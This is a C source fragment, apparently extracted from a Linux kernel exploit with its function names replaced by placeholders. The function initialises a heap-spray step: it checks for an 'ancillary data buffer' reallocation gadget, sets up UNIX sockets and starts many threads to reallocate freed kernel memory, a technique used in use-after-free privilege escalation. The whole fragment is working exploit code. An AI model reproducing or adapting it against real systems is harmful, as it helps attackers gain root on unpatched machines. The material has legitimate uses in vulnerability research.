#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct realloc_thread_arg {int /*<<< orphan*/  tid; } ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 () ; 
 int /*<<< orphan*/  FUNC1 () ; 
 size_t g_nb_realloc_thread_ready ; 
 scalar_t__ FUNC2 () ; 
 scalar_t__ FUNC3 (struct realloc_thread_arg*) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,...) ; 
 int FUNC6 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,struct realloc_thread_arg*) ; 
 int /*<<< orphan*/  realloc_thread ; 

__attribute__((used)) static int FUNC7(struct realloc_thread_arg *rta, size_t nb_reallocs)
{
  int thread = 0;
  int ret = -1;

  if (!FUNC1())
  {
    FUNC5("[-] can't use the 'ancillary data buffer' reallocation gadget!\n");
    goto fail;
  }
  FUNC5("[+] can use the 'ancillary data buffer' reallocation gadget!\n");

  if (FUNC2())
  {
    FUNC5("[-] failed to initialize reallocation data!\n");
    goto fail;
  }
  FUNC5("[+] reallocation data initialized!\n");

  FUNC5("[ ] initializing reallocation threads, please wait...\n");
  for (thread = 0; thread < nb_reallocs; ++thread)
  {
    if (FUNC3(&rta[thread]))
    {
      FUNC5("[-] failed to init UNIX sockets!\n");
      goto fail;
    }

    if ((ret = FUNC6(&rta[thread].tid, NULL, realloc_thread, &rta[thread])) != 0)
    {
      FUNC4("[-] pthread_create");
      goto fail;
    }
  }

  // wait until all threads have been created
  while (g_nb_realloc_thread_ready < nb_reallocs)
    FUNC0(); // don't run me, run the reallocator threads!

  FUNC5("[+] %lu reallocation threads ready!\n", nb_reallocs);

  return 0;

fail:
  FUNC5("[-] failed to initialize reallocation\n");
  return -1;
}